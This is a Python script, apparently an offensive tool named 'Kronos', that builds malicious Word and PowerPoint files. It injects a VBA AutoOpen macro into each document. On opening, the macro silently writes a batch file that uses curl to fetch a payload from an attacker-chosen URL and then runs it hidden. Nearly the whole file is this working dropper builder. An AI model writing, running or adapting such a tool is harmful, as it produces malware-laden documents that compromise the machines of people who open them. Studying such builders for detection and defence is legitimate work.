
import aspose.words as aw
import aspose.slides  as slides
import argparse
import colorama
from colorama import Fore, Style
import os
import random


def display_ansi_art(file_path):
    with open(file_path, 'r', encoding='latin-1') as file:
        ansi_art = file.read()
    print(ansi_art)


def doc(word,url,PE):
# Load Word document.
    doc = aw.Document(word)

    # Create VBA project
    project = aw.vba.VbaProject()
    project.name = "KronosProject"
    doc.vba_project = project

    # Create a new module and specify a macro source code.
    module = aw.vba.VbaModule()
    module.name = "KronosModule"
    module.type = aw.vba.VbaModuleType.PROCEDURAL_MODULE
    name=PE
    parts = PE.split()
    if len(parts) > 1:
        second_part = parts[1]
        print('Second part of PE:', second_part)
        name=second_part
        
        # Set module source code
    module.source_code = f''' Sub AutoOpen()
    '
    ' AutoOpen
    '
    '
    Dim downloadURL, downloadedFile, tempPath
    downloadURL = "{url}"
    downloadedFile = "{PE}"
    tempPath = Environ("HOMEPATH")

    Dim objFSO, objFile
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objFile = objFSO.CreateTextFile(tempPath & "\kronos.bat", True)
    
    objFile.WriteLine "@echo off"
    objFile.WriteLine "cd /d %HOMEPATH%"
    objFile.WriteLine "set downloadURL=" & downloadURL
    objFile.WriteLine "set downloadedFile={name}"
    objFile.WriteLine "curl -o ""%downloadedFile%"" -L ""%downloadURL%"""
    objFile.WriteLine "set downloadedFile={PE}"
    objFile.WriteLine "%downloadedFile%"
    objFile.Close

    Set objShell = CreateObject("WScript.Shell")
    objShell.Run tempPath & "\kronos.bat", 0, False
End Sub
 '''

    # Add module to the VBA project.
    doc.vba_project.modules.add(module)

    # Save document.
    doc.save("Kronos.docm")

def ppt(ppt,url,PE):

    # Create or load a presentation
    with slides.Presentation() as presentation:
        # Create new VBA project
        presentation.vba_project = slides.vba.VbaProject()

        # Add empty module to the VBA project
        module = presentation.vba_project.modules.add_empty_module("Module")
        name=PE
        parts = PE.split()
        if len(parts) > 1:
            second_part = parts[1]
            print('Second part of PE:', second_part)
            name=second_part
        
        # Set module source code
        module.source_code = f''' Sub AutoOpen()
    '
    ' AutoOpen
    '
    '
    Dim downloadURL, downloadedFile
downloadURL = "{url}"
downloadedFile = "{PE}"

Dim objFSO, objFile
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile(".\kronos.bat", True)
objFile.WriteLine "@echo off"
objFile.WriteLine "set downloadURL=" & downloadURL
objFile.WriteLine "set downloadedFile={name}"
objFile.WriteLine "curl -o ""%downloadedFile%"" -L ""%downloadURL%"""
objFile.WriteLine "set downloadedFile={PE}"
objFile.WriteLine "%downloadedFile%"
objFile.Close

Set objShell = CreateObject("WScript.Shell")
objShell.Run ".\kronos.bat", 0, False
End Sub
 '''

        # Create reference to <stdole>
        stdoleReference = slides.vba.VbaReferenceOleTypeLib("stdole", "*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\Windows\\system32\\stdole2.tlb#OLE Automation")

        # Create reference to Office
        officeReference =slides.vba.VbaReferenceOleTypeLib("Office", "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.0#0#C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE14\\MSO.DLL#Microsoft Office 14.0 Object Library")

        # add references to the VBA project
        presentation.vba_project.references.add(stdoleReference)
        presentation.vba_project.references.add(officeReference)

        # Save presentation
        presentation.save("Kronos.pptm", slides.export.SaveFormat.PPTM)

def main():
    colorama.init(autoreset=True)  # Initialize colorama for Windows
    ans_directory = 'banners'
    spec= os.path.abspath(".")
    spec_files= [file for file in os.listdir(spec) if file.endswith('.spec')]
    ans_files = [file for file in os.listdir(ans_directory) if file.endswith('.ans')]
    if not ans_files:
        print("No .ans files found in the current directory.")
        return
    for file in spec_files:
        if file.endswith('.spec'):
            file_path = os.path.join(spec, file)
            os.remove(file_path)
            print(f"Deleted file: {file}")
    random_ans_file = os.path.join(ans_directory, random.choice(ans_files))
    display_ansi_art(random_ans_file)
    introduction = ( 
        Fore.RED + "         Time is like a Sword, if you don't cut it, it cuts you.  \n"
        "Version: 1.0\n"
        "Author: ELMERIKH" + Style.RESET_ALL
    )
    print(introduction)
    ans_directory = 'banners'
    parser = argparse.ArgumentParser(description="Kronos")
    parser.add_argument('--word_file', help='Input Word file path')
    parser.add_argument('--ppt_file', help='Input PowerPoint file path')
    parser.add_argument('-url', help='url for payload')
    parser.add_argument('-PE', help='payload')
    
    args = parser.parse_args()

    if not args.word_file and not args.ppt_file:
        # If no file input specified, create one from Kronos.pptx for Word, Kronos.pptm for PowerPoint, or Kronos.xlsx for Excel
        if os.path.exists("Word.docx"):
            doc("Word.docx",args.url,args.PE)
            print("Word document created successfully  Kronos.docm.")
        if os.path.exists("PPT.pptm"):
            ppt("PPT.pptm",args.url,args.PE)
            print("PowerPoint presentation created successfully  Kronos.pptm.")
        
    else:
        if args.word_file:
            doc(args.word_file,args.url,args.PE)
            print("Word document created successfully.")
        if args.ppt_file:
            ppt(args.ppt_file,args.url,args.PE)
            print("PowerPoint presentation created successfully.")
        

if __name__ == "__main__":
    main()
